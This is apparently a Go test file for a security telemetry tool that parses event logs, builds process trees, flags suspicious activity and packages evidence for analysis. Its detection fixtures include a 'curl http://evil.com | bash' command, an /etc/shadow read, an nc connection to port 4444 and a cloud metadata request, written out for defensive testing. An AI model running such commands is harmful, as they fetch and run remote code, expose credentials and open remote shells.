package securityinsight

import (
	"encoding/json"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/tensorchord/watchu/export"
)

func TestLoadEvents(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "test.jsonl")

	ts := time.Date(2025, 1, 15, 10, 0, 0, 0, time.UTC)
	records := []export.JSONLRecord{
		{
			Endpoint:  "exec_event",
			Timestamp: ts,
			Event: export.RecordExec{
				Timestamp: ts,
				Pid:       100,
				PPid:      1,
				ExecId:    "exec-1",
				PExecId:   "exec-0",
				Comm:      "bash",
				Args:      "-c echo hello",
				Host:      "myhost",
			},
		},
		{
			Endpoint:  "http_request",
			Timestamp: ts,
			Event: export.RecordRequest{
				Timestamp: ts,
				Pid:       100,
				Tid:       100,
				Comm:      "curl",
				Method:    "POST",
				URL:       "https://api.openai.com/v1/chat/completions",
				Body:      []byte(`{"model":"gpt-4","messages":[{"role":"user","content":"hello"}]}`),
				Host:      "myhost",
			},
		},
		{
			Endpoint:  "http_response",
			Timestamp: ts.Add(1 * time.Second),
			Event: export.RecordResponse{
				Timestamp:  ts.Add(1 * time.Second),
				Pid:        100,
				Tid:        100,
				StatusCode: 200,
				Body:       []byte(`{"choices":[{"message":{"content":"hi"}}]}`),
				Host:       "myhost",
			},
		},
		{
			Endpoint:  "file_op",
			Timestamp: ts,
			Event: export.RecordFileOp{
				Timestamp: ts,
				Pid:       100,
				Comm:      "cat",
				Op:        "read",
				Path:      "/etc/shadow",
				Host:      "myhost",
			},
		},
		{
			Endpoint:  "tcp_connect",
			Timestamp: ts,
			Event: export.RecordTCPConnect{
				Timestamp:  ts,
				Pid:        100,
				Comm:       "nc",
				TargetAddr: "10.0.0.1",
				TargetPort: 4444,
				Host:       "myhost",
			},
		},
	}

	f, err := os.Create(path)
	if err != nil {
		t.Fatal(err)
	}
	enc := json.NewEncoder(f)
	for _, rec := range records {
		if err := enc.Encode(rec); err != nil {
			t.Fatal(err)
		}
	}
	// add a malformed line
	if _, err := f.WriteString("this is not json\n"); err != nil {
		t.Fatal(err)
	}
	f.Close()

	store, malformed, err := LoadEvents(path)
	if err != nil {
		t.Fatalf("LoadEvents: %v", err)
	}
	if malformed != 1 {
		t.Errorf("expected 1 malformed line, got %d", malformed)
	}
	if len(store.ExecEvents) != 1 {
		t.Errorf("expected 1 exec event, got %d", len(store.ExecEvents))
	}
	if len(store.Requests) != 1 {
		t.Errorf("expected 1 request, got %d", len(store.Requests))
	}
	if len(store.Responses) != 1 {
		t.Errorf("expected 1 response, got %d", len(store.Responses))
	}
	if len(store.FileOps) != 1 {
		t.Errorf("expected 1 file op, got %d", len(store.FileOps))
	}
	if len(store.TCPConns) != 1 {
		t.Errorf("expected 1 tcp connect, got %d", len(store.TCPConns))
	}
}

func TestLoadEventsGlob(t *testing.T) {
	dir := t.TempDir()
	ts := time.Date(2025, 1, 15, 10, 0, 0, 0, time.UTC)

	for _, name := range []string{"a.jsonl", "b.jsonl"} {
		path := filepath.Join(dir, name)
		f, _ := os.Create(path)
		rec := export.JSONLRecord{
			Endpoint:  "exec_event",
			Timestamp: ts,
			Event: export.RecordExec{
				Timestamp: ts, Pid: 1, ExecId: "e-" + name, Comm: "test",
			},
		}
		json.NewEncoder(f).Encode(rec)
		f.Close()
	}

	store, _, err := LoadEvents(filepath.Join(dir, "*.jsonl"))
	if err != nil {
		t.Fatalf("LoadEvents glob: %v", err)
	}
	if len(store.ExecEvents) != 2 {
		t.Errorf("expected 2 exec events from glob, got %d", len(store.ExecEvents))
	}
}

func TestProcessTree(t *testing.T) {
	execs := []export.RecordExec{
		{ExecId: "root", PExecId: "", Pid: 1, Comm: "init"},
		{ExecId: "child1", PExecId: "root", Pid: 2, Comm: "bash"},
		{ExecId: "child2", PExecId: "child1", Pid: 3, Comm: "curl"},
	}
	tree := BuildProcessTree(execs)

	if got := tree.RootExecID("child2"); got != "root" {
		t.Errorf("RootExecID(child2) = %q, want root", got)
	}
	if got := tree.RootExecID("root"); got != "root" {
		t.Errorf("RootExecID(root) = %q, want root", got)
	}

	descendants := tree.Descendants("root")
	if len(descendants) != 3 {
		t.Errorf("Descendants(root): got %d, want 3", len(descendants))
	}

	pids := tree.DescendantPIDs("root")
	for _, pid := range []int32{1, 2, 3} {
		if _, ok := pids[pid]; !ok {
			t.Errorf("DescendantPIDs missing pid %d", pid)
		}
	}
}

func TestHeuristics(t *testing.T) {
	events := &FilteredEvents{
		ExecEvents: []export.RecordExec{
			{Comm: "bash", Args: "-c curl http://evil.com | bash", Pid: 10},
		},
		FileOps: []export.RecordFileOp{
			{Path: "/etc/shadow", Op: "read", Pid: 10, Comm: "cat", Timestamp: time.Now()},
		},
		TCPConns: []export.RecordTCPConnect{
			{TargetAddr: "10.0.0.1", TargetPort: 4444, Pid: 10, Comm: "nc"},
		},
		Requests: []export.RecordRequest{
			{URL: "http://169.254.169.254/latest/meta-data/", Method: "GET", Pid: 10, Comm: "curl"},
		},
	}

	alerts := RunHeuristics(events)
	if len(alerts) < 4 {
		t.Errorf("expected at least 4 alerts, got %d", len(alerts))
		for _, a := range alerts {
			t.Logf("  %s: %s (%s)", a.Severity, a.AlertType, a.Reason)
		}
	}

	// check that suspicious command is detected
	found := false
	for _, a := range alerts {
		if a.AlertType == "suspicious_command" && a.Severity == "high" {
			found = true
		}
	}
	if !found {
		t.Error("expected suspicious_command alert with high severity")
	}
}

func TestCollectThreatEvidence(t *testing.T) {
	ts := time.Date(2025, 1, 15, 10, 0, 0, 0, time.UTC)
	store := &EventStore{
		ExecEvents: []export.RecordExec{
			{Timestamp: ts, Pid: 1, ExecId: "root", PExecId: "", Comm: "bash", Args: "curl http://evil.com | bash", Host: "myhost"},
			{Timestamp: ts, Pid: 2, ExecId: "child", PExecId: "root", Comm: "curl", Args: "http://evil.com", Host: "myhost"},
		},
		FileOps: []export.RecordFileOp{
			{Timestamp: ts, Pid: 1, Path: "/etc/shadow", Op: "read", Comm: "cat", Host: "myhost"},
		},
	}
	tree := BuildProcessTree(store.ExecEvents)

	pkg, err := CollectThreatEvidence(store, tree, "root", CollectOptions{})
	if err != nil {
		t.Fatalf("CollectThreatEvidence: %v", err)
	}
	if pkg.RootExecID != "root" {
		t.Errorf("RootExecID = %q, want root", pkg.RootExecID)
	}
	if pkg.AnalysisType != "threat" {
		t.Errorf("AnalysisType = %q, want threat", pkg.AnalysisType)
	}
	if len(pkg.HeuristicAlerts) == 0 {
		t.Error("expected heuristic alerts, got none")
	}
	if pkg.TelemetrySummary == nil {
		t.Error("expected telemetry summary, got nil")
	}

	// verify rendering
	prompt := RenderThreatEvidencePrompt(pkg)
	if !containsAll(prompt, "SECURITYINSIGHT EVIDENCE PACKAGE", "threat", "root") {
		t.Errorf("prompt rendering missing expected content:\n%s", prompt)
	}

	// verify JSON output
	jsonBytes, err := MarshalCollectedJSON(pkg)
	if err != nil {
		t.Fatalf("MarshalCollectedJSON: %v", err)
	}
	var parsed ThreatEvidencePackage
	if err := json.Unmarshal(jsonBytes, &parsed); err != nil {
		t.Fatalf("unmarshal JSON output: %v", err)
	}
	if parsed.RootExecID != "root" {
		t.Errorf("parsed JSON root_exec_id = %q, want root", parsed.RootExecID)
	}
}

func TestCollectPromptEvidence(t *testing.T) {
	ts := time.Date(2025, 1, 15, 10, 0, 0, 0, time.UTC)
	store := &EventStore{
		ExecEvents: []export.RecordExec{
			{Timestamp: ts, Pid: 1, ExecId: "root", PExecId: "", Comm: "node", Host: "myhost"},
		},
		Requests: []export.RecordRequest{
			{
				Timestamp: ts,
				Pid:       1,
				Tid:       1,
				Comm:      "node",
				Method:    "POST",
				URL:       "https://api.openai.com/v1/chat/completions",
				Body:      []byte(`{"model":"gpt-4","messages":[{"role":"user","content":"hello world"}]}`),
				Host:      "myhost",
			},
		},
		Responses: []export.RecordResponse{
			{
				Timestamp:  ts.Add(500 * time.Millisecond),
				Pid:        1,
				Tid:        1,
				StatusCode: 200,
				Body:       []byte(`{"choices":[{"message":{"content":"hi"}}]}`),
				Host:       "myhost",
			},
		},
	}
	tree := BuildProcessTree(store.ExecEvents)

	pkg, err := CollectPromptEvidence(store, tree, "myhost", ts.Add(-1*time.Minute), ts.Add(1*time.Minute), CollectOptions{})
	if err != nil {
		t.Fatalf("CollectPromptEvidence: %v", err)
	}
	if pkg.AnalysisType != "prompt" {
		t.Errorf("AnalysisType = %q, want prompt", pkg.AnalysisType)
	}
	if len(pkg.Candidates) != 1 {
		t.Fatalf("expected 1 candidate, got %d", len(pkg.Candidates))
	}
	if pkg.Candidates[0].Provider != "openai" {
		t.Errorf("provider = %q, want openai", pkg.Candidates[0].Provider)
	}
	if pkg.Candidates[0].Model != "gpt-4" {
		t.Errorf("model = %q, want gpt-4", pkg.Candidates[0].Model)
	}

	// verify rendering
	prompt := RenderPromptEvidencePrompt(pkg)
	if !containsAll(prompt, "SECURITYINSIGHT EVIDENCE PACKAGE", "prompt", "openai") {
		t.Errorf("prompt rendering missing expected content:\n%s", prompt)
	}
}

func TestCollectPromptEvidenceByRootExecID(t *testing.T) {
	ts := time.Date(2025, 1, 15, 10, 0, 0, 0, time.UTC)
	store := &EventStore{
		ExecEvents: []export.RecordExec{
			{Timestamp: ts, Pid: 1, ExecId: "root", PExecId: "", Comm: "node", Host: "myhost"},
		},
		Requests: []export.RecordRequest{
			{
				Timestamp: ts,
				Pid:       1,
				Tid:       1,
				Method:    "POST",
				URL:       "https://api.anthropic.com/v1/messages",
				Body:      []byte(`{"model":"claude-3","messages":[{"role":"user","content":"test"}]}`),
				Host:      "myhost",
			},
		},
	}
	tree := BuildProcessTree(store.ExecEvents)

	pkg, err := CollectPromptEvidenceByRootExecID(store, tree, "root", CollectOptions{})
	if err != nil {
		t.Fatalf("CollectPromptEvidenceByRootExecID: %v", err)
	}
	if pkg.RootExecID != "root" {
		t.Errorf("RootExecID = %q, want root", pkg.RootExecID)
	}
	if len(pkg.Candidates) != 1 {
		t.Fatalf("expected 1 candidate, got %d", len(pkg.Candidates))
	}
	if pkg.Candidates[0].Provider != "anthropic" {
		t.Errorf("provider = %q, want anthropic", pkg.Candidates[0].Provider)
	}
}

func TestResolveThreatRootExecID(t *testing.T) {
	ts := time.Date(2025, 1, 15, 10, 0, 0, 0, time.UTC)
	store := &EventStore{
		ExecEvents: []export.RecordExec{
			{Timestamp: ts, Pid: 1, ExecId: "old-root", PExecId: "", Comm: "bash", Host: "myhost"},
			{Timestamp: ts.Add(1 * time.Hour), Pid: 2, ExecId: "new-root", PExecId: "", Comm: "bash", Host: "myhost"},
		},
	}
	tree := BuildProcessTree(store.ExecEvents)

	// latest mode
	id, meta, err := ResolveThreatRootExecID(store, tree, ThreatSelector{Latest: true})
	if err != nil {
		t.Fatalf("ResolveThreatRootExecID latest: %v", err)
	}
	if id != "new-root" {
		t.Errorf("latest resolved = %q, want new-root", id)
	}
	if meta["selection_mode"] != "latest" {
		t.Errorf("meta selection_mode = %v, want latest", meta["selection_mode"])
	}

	// time window mode
	id, _, err = ResolveThreatRootExecID(store, tree, ThreatSelector{
		Since: ts.Add(-1 * time.Minute),
		Until: ts.Add(1 * time.Minute),
	})
	if err != nil {
		t.Fatalf("ResolveThreatRootExecID time window: %v", err)
	}
	if id != "old-root" {
		t.Errorf("time window resolved = %q, want old-root", id)
	}
}

func TestRenderHelpers(t *testing.T) {
	// trimForBudget
	if got := trimForBudget("  hello  world  ", 100); got != "hello world" {
		t.Errorf("trimForBudget no-trim = %q", got)
	}
	if got := trimForBudget("abcdefghij", 5); got != "ab..." {
		t.Errorf("trimForBudget truncated = %q", got)
	}
	if got := trimForBudget("", 100); got != "" {
		t.Errorf("trimForBudget empty = %q", got)
	}

	// emptyDash
	if got := emptyDash(""); got != "-" {
		t.Errorf("emptyDash empty = %q", got)
	}
	if got := emptyDash("hello"); got != "hello" {
		t.Errorf("emptyDash non-empty = %q", got)
	}

	// severityRank
	if severityRank("critical") != 0 {
		t.Error("severityRank critical != 0")
	}
	if severityRank("HIGH") != 1 {
		t.Error("severityRank HIGH != 1")
	}
	if severityRank("unknown") != 6 {
		t.Error("severityRank unknown != 6")
	}
}

func containsAll(s string, subs ...string) bool {
	for _, sub := range subs {
		if !contains(s, sub) {
			return false
		}
	}
	return true
}

func contains(s, sub string) bool {
	return len(s) >= len(sub) && (s == sub || len(s) > 0 && containsStr(s, sub))
}

func containsStr(s, sub string) bool {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}
